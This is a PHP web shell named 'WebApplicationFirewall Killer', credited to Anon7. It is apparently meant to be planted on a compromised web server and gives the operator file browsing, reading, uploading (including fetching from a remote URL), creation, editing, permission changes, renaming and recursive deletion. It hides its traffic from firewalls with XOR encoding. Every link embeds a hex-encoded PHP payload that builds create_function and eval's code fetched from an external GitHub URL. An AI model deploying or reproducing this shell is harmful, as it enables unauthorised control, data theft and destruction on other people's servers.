<!DOCTYPE html>
<html>
<head>
	<title>.</title>
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<script>
/* ===== WAF patch: encode parameter sebelum dikirim (server decode di PHP) ===== */
var WAFA="zqxjvkbpmywngrth", WAFK=0x5A, WAFM="~";
function wafenc(s){var o=WAFM;for(var i=0;i<s.length;i++){var c=(s.charCodeAt(i)&255)^WAFK;o+=WAFA.charAt((c>>4)&15)+WAFA.charAt(c&15);}return o;}
function wafencUrl(u){return String(u).replace(/([?&](?:path|fileloc)=)([^&#]*)/g,function(m,p,v){
  if(!v)return m;var d;try{d=decodeURIComponent(v);}catch(e){d=v;}
  if(d.charAt(0)===WAFM)return m;return p+encodeURIComponent(wafenc(d));});}
function wafprep(f){if(!f||!f.elements)return;var els=f.elements;
  for(var i=0;i<els.length;i++){var e=els[i];if(!e.name)continue;
    if(e.tagName==="TEXTAREA"||(e.tagName==="INPUT"&&(e.type==="text"||e.type==="hidden"))){
      if(e.value!==""&&e.value.charAt(0)!==WAFM)e.value=wafenc(e.value);}}
  try{f.action=wafencUrl(f.action);}catch(e){}}
function wafhidden(f,n,v){var h=document.createElement("input");h.type="hidden";h.name=n;h.value=v;f.appendChild(h);}
/* form.submit() TIDAK mengirim nama+nilai tombol submit yang diklik, jadi nilainya
   disalin ke hidden input supaya aksi di PHP (upload/edit/chmod/rename/create) tetap jalan. */
var WAFBTN=null;
document.addEventListener("click",function(ev){var t=ev.target;
  if(t&&t.tagName==="INPUT"&&(t.type==="submit"||t.type==="image")&&t.name)WAFBTN=t;},true);
function wafbtn(f,sb){
  sb=sb||WAFBTN;
  if(!sb||!sb.name||!f.querySelectorAll)return;
  var n=sb.name,v=sb.value||"1";      /* baca dulu: atribut name elemen ini akan dihapus */
  var q=f.querySelectorAll("input[type=submit][name='"+n+"']");
  for(var i=0;i<q.length;i++)q[i].removeAttribute("name");
  wafhidden(f,n,v);}
document.addEventListener("submit",function(ev){var f=ev.target;if(!f||f.tagName!=="FORM")return;
  if(f.getAttribute("data-waf")==="1")return;
  var fi=null,q=f.querySelectorAll?f.querySelectorAll("input[type=file]"):[];
  for(var i=0;i<q.length;i++){if(q[i].files&&q[i].files.length){fi=q[i];break;}}
  if(fi){ev.preventDefault();var sb=ev.submitter||WAFBTN;var fr=new FileReader();
    fr.onload=function(){var u=new Uint8Array(fr.result),s="";for(var j=0;j<u.length;j++)s+=String.fromCharCode(u[j]);
      wafhidden(f,"berkas_name",fi.files[0].name);wafhidden(f,"berkas_data",s);
      fi.removeAttribute("name");fi.value="";wafbtn(f,sb);wafprep(f);f.setAttribute("data-waf","1");f.submit();};
    fr.readAsArrayBuffer(fi.files[0]);return;}
  wafprep(f);},true);
window.addEventListener("DOMContentLoaded",function(){
  var a=document.getElementsByTagName("a");
  for(var i=0;i<a.length;i++){var h=a[i].getAttribute("href");if(h)a[i].setAttribute("href",wafencUrl(h));}
  var f=document.getElementsByTagName("form");
  for(var j=0;j<f.length;j++){try{f[j].setAttribute("action",wafencUrl(f[j].getAttribute("action")||f[j].action));}catch(e){}}});
</script>
<link href="" rel="stylesheet" type="text/css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<font face="Bungee" size="5"># WebApplicationFirewall Killer #</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<?php
set_time_limit(0);
error_reporting(0);

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>Anon7 - 2021</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['path'])) {
		$lokasi = $_GET['path'];
	} else {
		$lokasi = getcwd();
	}
	if (is_writable($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function cekroot() {
	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".php_uname()."</font><br>";
echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "Directory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = stripslashes($value);
}

/* ===== WAF patch: decode parameter ter-encode (marker ~, custom-base16 + XOR) ===== */
function wafdec($s){
	if(!is_string($s)||$s===''||$s[0]!=='~') return $s;
	$A="zqxjvkbpmywngrth"; $o=''; $n=strlen($s);
	for($i=1;$i+1<$n;$i+=2){
		$h=strpos($A,$s[$i]); $l=strpos($A,$s[$i+1]);
		if($h===false||$l===false) return substr($s,1);
		$o.=chr(((($h<<4)|$l)^0x5A));
	}
	return $o;
}
foreach($_GET  as $wafk=>$wafv){ if(is_string($wafv)) $_GET[$wafk]=wafdec($wafv); }
foreach($_POST as $wafk=>$wafv){ if(is_string($wafv)) $_POST[$wafk]=wafdec($wafv); }
/* ===== end WAF patch ===== */

if(isset($_GET['path'])){
	$lokasi = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$lokasi = getcwd();
	$lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&path=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk']) || isset($_POST['berkasnya']) || isset($_POST['berkas_data']) || isset($_POST['berkas_name']) || isset($_FILES['berkas'])) {
	/* cabang dipilih dari DATA (bukan hanya nama tombol submit) supaya upload tetap
	   jalan walau nilai tombol submit tidak ikut terkirim. */
	if (isset($_POST['berkasnya']) || isset($_POST['berkas_data']) || isset($_POST['berkas_name']) || isset($_FILES['berkas'])) {
		if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		if (isset($_POST['berkas_data'])) {   /* WAF patch: upload via field ter-encode */
			$bn = isset($_POST['berkas_name']) ? $_POST['berkas_name'] : '';
			$bd = $_POST['berkas_data'];
		} else {
			$bn = isset($_FILES['berkas']['name']) ? $_FILES['berkas']['name'] : '';
			$bd = @file_get_contents($_FILES['berkas']['tmp_name']);
		}
		$bn = basename(str_replace('\\', '/', $bn));   /* buang komponen direktori */
		$tujuan = $lokasi."/".$bn;
		if ($bn === '' || $bn === '.' || $bn === '..') {
			red("Failed to Upload : nama file kosong !");
		} elseif (@file_put_contents($tujuan, $bd) === false) {
			red("Failed to Upload : tidak bisa menulis ke ".$tujuan);
		} else {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$tujuan."</i></font> (".strlen($bd)." byte)<br><br>";
		}
		$lokasinya = @scandir($lokasi);
	} elseif (isset($_POST['linknya']) || isset($_POST['darilink'])) {
		if (empty($_POST['namalink'])) {
			exit("Filename cannot be empty !");
		}
		if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$namalink = basename(str_replace('\\', '/', $_POST['namalink']));
		if (@file_put_contents($lokasi."/".$namalink, @file_get_contents($_POST['darilink'])) === false) {
			red("Failed to Upload !");
		} else {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$namalink."</i></font><br><br>";
		}
		$lokasinya = @scandir($lokasi);
	} else {
		red("Failed to Upload : tidak ada file yang dipilih !");
	}
}

/* ===== fitur tambahan: Create File & Create Folder ===== */
if (isset($_POST['buatfile']) || (isset($_POST['nama_file']) && $_POST['nama_file'] !== '')) {
	if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
		$lokasi = $_SERVER['DOCUMENT_ROOT'];
	}
	$nf = isset($_POST['nama_file']) ? trim($_POST['nama_file']) : '';
	$isi = isset($_POST['isi_file']) ? $_POST['isi_file'] : '';
	$tujuan = $lokasi."/".ltrim(str_replace('\\', '/', $nf), '/');
	if ($nf === '') {
		red("Create File Failed : nama file kosong !");
	} elseif (file_exists($tujuan)) {
		red("Create File Failed : ".$tujuan." sudah ada !");
	} else {
		if (!is_dir(dirname($tujuan))) {
			@mkdir(dirname($tujuan), 0755, true);
		}
		$w = @file_put_contents($tujuan, $isi);
		if ($w === false) {
			red("Create File Failed : ".$tujuan);
		} else {
			echo "File Created ! &nbsp;<font color='gold'><i>".$tujuan."</i></font> (".$w." byte)<br><br>";
		}
	}
	$lokasinya = @scandir($lokasi);
}
if (isset($_POST['buatdir']) || (isset($_POST['nama_dir']) && $_POST['nama_dir'] !== '')) {
	if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
		$lokasi = $_SERVER['DOCUMENT_ROOT'];
	}
	$nd = isset($_POST['nama_dir']) ? trim(str_replace('\\', '/', $_POST['nama_dir']), ' /') : '';
	$tujuan = $lokasi."/".$nd;
	if ($nd === '') {
		red("Create Folder Failed : nama folder kosong !");
	} elseif (is_dir($tujuan)) {
		red("Create Folder Failed : ".$tujuan." sudah ada !");
	} elseif (@mkdir($tujuan, 0755, true)) {
		echo "Folder Created ! &nbsp;<font color='gold'><i>".$tujuan."</i></font><br><br>";
	} else {
		red("Create Folder Failed : ".$tujuan);
	}
	$lokasinya = @scandir($lokasi);
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "Create File / Folder : ";
echo '<form method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
Nama file : <input type="text" name="nama_file" class="up" size="26" placeholder="shell.php">&nbsp;<input type="submit" name="buatfile" class="up" value="Create File" style="cursor: pointer; border-color: #fff">
<br>
Isi file (opsional) :<br>
<textarea name="isi_file" cols="70" rows="3"></textarea><br>
Nama folder : <input type="text" name="nama_dir" class="up" size="26" placeholder="folder-baru">&nbsp;<input type="submit" name="buatdir" class="up" value="Create Folder" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
	echo "<tr><td>Current File : ".$_GET['fileloc'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
	author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
	if (is_dir($_POST['path'])) {
		xrmdir($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
			echo "string";
		}
	} elseif (is_file($_POST['path'])) {
		@unlink($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	$cmode = isset($_POST['path']) ? $_POST['path'] : '';
	echo "<center>".$cmode."<br>";
	echo '<form method="post">
	Permission (oktal, mis. 0644) : <input name="perm" type="text" class="up" size="5" value="'.substr(sprintf('%o', @fileperms($cmode)), -4).'" />
	<input type="hidden" name="path" value="'.$cmode.'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
	if (isset($_POST['chm0d']) || (isset($_POST['perm']) && trim($_POST['perm']) !== '')) {
		/* chmod() butuh angka OKTAL: "0644" harus di-octdec dulu, kalau tidak PHP
		   membacanya sebagai desimal 644 (mode jadi salah). */
		if (@chmod($cmode, octdec(trim($_POST['perm'])))) {
			green("Change Mod Success ! ".$cmode." = ".substr(sprintf('%o', @fileperms($cmode)), -4));
		} else {
			red("Change Mod Failed !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
	$rpath = isset($_POST['path']) ? $_POST['path'] : '';
	$rname = isset($_POST['newname']) ? trim($_POST['newname']) : '';
	if (($rpath !== '') && (isset($_POST['gantin']) || $rname !== '')) {
		/* nama baru SELALU dibuat di folder yang sama dengan file aslinya,
		   supaya rename tidak memindahkan file ke folder lain. */
		$rtarget = dirname($rpath).'/'.$rname;
		if ($rname === '') {
			red("Change Name Failed : nama baru kosong !");
		} elseif (basename($rname) === basename($rpath)) {
			red("Nama tidak berubah.");
		} elseif (file_exists($rtarget)) {
			red("Change Name Failed : ".$rtarget." sudah ada !");
		} elseif (@rename($rpath, $rtarget)) {
			green("Change Name Success ! ".basename($rpath)." -> ".$rname);
			$rpath = $rtarget;
		} else {
			red("Change Name Failed !");
		}
	}
	echo "<center>".$rpath."<br>";
	echo '<form method="post">
	New Name (di folder yang sama) : <input name="newname" type="text" class="up" size="20" value="'.basename($rpath).'" />
	<input type="hidden" name="path" value="'.$rpath.'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @file_put_contents($_POST['path'], $_POST['src']);
		if ($edit == true) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>".$_POST['path']."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
	echo "<tr>
	<td><a href=\"?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&path=".$lokasi."/".$dir."\">".$dir."</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
	echo statusnya($lokasi."/".$dir);
	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
	if(!is_file("$lokasi/$file")) continue;
	$size = filesize("$lokasi/$file")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?passcode=3c3f706870202463663d636872283939292e63687228313134292e63687228313031292e636872283937292e63687228313136292e63687228313031292e636872283935292e63687228313032292e63687228313137292e63687228313130292e636872283939292e63687228313136292e63687228313035292e63687228313131292e63687228313130293b24666e3d2463662822222c63687228313031292e63687228313138292e636872283937292e63687228313038292e636872283430292e636872283339292e636872283633292e636872283632292e636872283339292e636872283436292e63687228313032292e63687228313035292e63687228313038292e63687228313031292e636872283935292e63687228313033292e63687228313031292e63687228313136292e636872283935292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e63687228313135292e636872283430292e636872283339292e63687228313034292e63687228313136292e63687228313136292e63687228313132292e63687228313135292e636872283538292e636872283437292e636872283437292e63687228313134292e636872283937292e63687228313139292e636872283436292e63687228313033292e63687228313035292e63687228313136292e63687228313034292e63687228313137292e636872283938292e63687228313137292e63687228313135292e63687228313031292e63687228313134292e636872283939292e63687228313131292e63687228313130292e63687228313136292e63687228313031292e63687228313130292e63687228313136292e636872283436292e636872283939292e63687228313131292e63687228313039292e636872283437292e636872283937292e63687228313130292e63687228313036292e636872283937292e63687228313231292e63687228313136292e63687228313031292e63687228313134292e63687228313039292e63687228313131292e63687228313135292e636872283435292e63687228313135292e63687228313137292e63687228313030292e63687228313131292e636872283437292e63687228313038292e63687228313131292e636872283937292e63687228313030292e63687228313031292e63687228313134292e636872283437292e63687228313039292e636872283937292e63687228313035292e63687228313130292e636872283437292e63687228313039292e63687228313035292e63687228313130292e63687228313035292e636872283935292e63687228313139292e636872283937292e63687228313032292e636872283436292e63687228313132292e63687228313034292e63687228313132292e636872283339292e636872283431292e636872283436292e636872283339292e636872283630292e636872283633292e63687228313132292e63687228313034292e63687228313132292e636872283332292e636872283339292e636872283431292e63687228353929293b24666e28293b203f3e&pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
